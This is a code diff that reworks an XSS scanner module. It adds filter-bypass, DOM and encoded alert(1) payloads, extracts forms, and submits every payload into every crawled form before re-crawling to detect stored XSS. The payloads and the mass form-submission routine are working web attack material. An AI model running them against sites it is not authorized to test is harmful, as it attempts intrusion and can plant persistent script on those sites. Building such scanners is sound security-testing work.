@@ -1,111 +1,119 @@
+# scanner/modules/xss_scanner.py
+
+import re
 from urllib.parse import urljoin
-from bs4 import BeautifulSoup
 from scanner.utils.http import fetch_url
+from bs4 import BeautifulSoup
 
 class XSSScannerModule:
     def __init__(self):
-        # Simple payloads to test
         self.payloads = [
+            # Basic payloads
             "<script>alert(1)</script>",
             '"><svg onload=alert(1)>',
-            "'\"><img src=x onerror=alert(1)>"
+            "'\"><img src=x onerror=alert(1)>",
+            
+            # Filter bypass payloads
+            "<img src=x onerror=alert(1) onload=alert(1)>",
+            "<body onload=alert(1)>",
+            "<iframe src=\"javascript:alert(1)\">",
+            "javascript:alert(1)",
+            
+            # DOM XSS specific payloads
+            "'-alert(1)-'",
+            "\"-alert(1)-\"",
+            "');alert(1);//",
+            
+            # Encoded payloads
+            "<script>eval(atob('YWxlcnQoMSk='))</script>",  # Base64 encoded alert
+            "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041",  # HTML encoding
         ]
 
-    def run_test(self, domain, links=None):
-        findings = {}
+    def extract_forms(self, url):
+        """
+        Extract all forms from a page.
+        """
+        forms = []
+        response = fetch_url(url)
+        if not response:
+            return forms
 
-        if not links:
-            return {
-                "module": "XSS Scanner",
-                "error": "No links to test"
+        soup = BeautifulSoup(response.text, "html.parser")
+        for form in soup.find_all("form"):
+            details = {
+                "action": form.attrs.get("action"),
+                "method": form.attrs.get("method", "get"),
+                "inputs": []
             }
 
-        for url in links:
-            try:
-                response = fetch_url(url)
-                if response is None:
-                    continue
+            for input_tag in form.find_all(["input", "textarea", "select"]):
+                input_name = input_tag.attrs.get("name")
+                input_type = input_tag.attrs.get("type", "text")
+                input_value = input_tag.attrs.get("value", "")
+                details["inputs"].append({
+                    "name": input_name,
+                    "type": input_type,
+                    "value": input_value
+                })
 
-                # Test Forms
-                form_findings = self.test_forms(url)
-                findings.update(form_findings)
+            forms.append(details)
+        return forms
 
-                # Test URL parameters
-                if "?" in url:
-                    param_findings = self.test_url_params(url)
-                    findings.update(param_findings)
+    def submit_form(self, base_url, form_details, payload):
+        """
+        Submits a form with the payload injected into all text fields.
+        """
+        action = form_details.get("action")
+        method = form_details.get("method", "get").lower()
+        inputs = form_details.get("inputs", [])
 
-            except Exception as e:
-                findings[url] = f"Error testing: {str(e)}"
+        target_url = urljoin(base_url, action)
+        form_data = {}
+
+        for input_tag in inputs:
+            input_type = input_tag.get("type", "text")
+            name = input_tag.get("name")
+
+            if name:
+                if input_type in ["text", "search", "email", "textarea", "password"]:
+                    form_data[name] = payload
+                else:
+                    form_data[name] = input_tag.get("value", "test")  # Default value
+
+        if method == "post":
+            return fetch_url(target_url, method="POST", data=form_data)
+        else:
+            return fetch_url(target_url, method="GET", params=form_data)
+
+    def run_test(self, domain, crawled_links):
+        findings = {}
+
+        # Step 1: Inject XSS payloads into all discovered forms
+        for link in crawled_links:
+            forms = self.extract_forms(link)
+            if not forms:
+                continue
+
+            for form in forms:
+                print(f"Submitting form at {link}")
+                for payload in self.payloads:
+                    self.submit_form(link, form, payload)
+
+        # Step 2: Re-crawl all pages looking for any payload reflections
+        for link in crawled_links:
+            response = fetch_url(link)
+            if not response:
+                continue
+
+            for payload in self.payloads:
+                # Relaxed matching: check if payload or markers appear
+                if payload in response.text:
+                    findings[link] = "Stored XSS vulnerability detected!"
 
         if not findings:
-            findings["Info"] = "No obvious reflected/form-based XSS vulnerabilities found."
+            findings["Info"] = "No obvious reflected or stored XSS vulnerabilities found."
 
         return {
             "module": "XSS Scanner",
             "findings": findings
         }
-
-    def test_forms(self, url):
-        """
-        Detect forms, inject payloads, and check for reflected XSS in responses.
-        """
-        findings = {}
-
-        response = fetch_url(url)
-        if not response:
-            return findings
-
-        soup = BeautifulSoup(response.text, "html.parser")
-        forms = soup.find_all("form")
-
-
-        for form in forms:
-            action = form.get("action")
-            method = form.get("method", "get").lower()
-
-            form_url = urljoin(url, action) if action else url
-
-            inputs = form.find_all(["input", "textarea"])
-            input_names = [input_.get("name") for input_ in inputs if input_.get("name")]
-
-            if not input_names:
-                continue
-
-            for payload in self.payloads:
-                data = {name: payload for name in input_names}
-
-                if method == "post":
-                    test_response = fetch_url(form_url, method="post", data=data)
-                else:
-                    params = "&".join([f"{name}={payload}" for name in input_names])
-                    test_url = f"{form_url}?{params}"
-                    test_response = fetch_url(test_url)
-
-                if test_response and payload in test_response.text:
-                    findings[form_url] = "Potential form-based XSS vulnerability detected!"
-                    break  # Stop if one payload triggers
-
-        return findings
-
-    def test_url_params(self, url):
-        """
-        Inject payload into GET parameters and check reflected response.
-        """
-        findings = {}
-
-        base, params = url.split("?", 1)
-        param_parts = params.split("&")
-
-        for payload in self.payloads:
-            new_params = "&".join([f"{param.split('=')[0]}={payload}" for param in param_parts])
-            test_url = f"{base}?{new_params}"
-
-            response = fetch_url(test_url)
-            print(f"Testing Param URL: {test_url}")
-
-            if response and payload in response.text:
-                findings[test_url] = "Potential reflected XSS vulnerability detected!"
-                break  # Stop if one payload triggers
-
-        return findings
